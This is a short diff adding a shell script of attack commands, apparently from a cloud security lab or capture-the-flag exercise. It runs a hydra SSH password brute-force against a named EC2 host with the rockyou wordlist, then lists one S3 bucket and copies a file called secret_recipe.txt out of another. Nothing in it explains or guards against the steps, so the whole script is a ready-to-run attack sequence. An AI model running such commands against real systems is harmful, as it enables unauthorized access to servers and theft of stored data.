@@ -1,0 +1,5 @@
+date
+hydra -l ubuntu -P rockyou.txt ssh://ec2-35-168-109-134.compute-1.amazonaws.com
+
+aws s3 ls  s3://cand-c3-secret-recipes-867570599403/ --region us-east-1
+aws s3 cp s3://cand-c3-free-recipes-867570599403/secret_recipe.txt  .  --region us-east-1
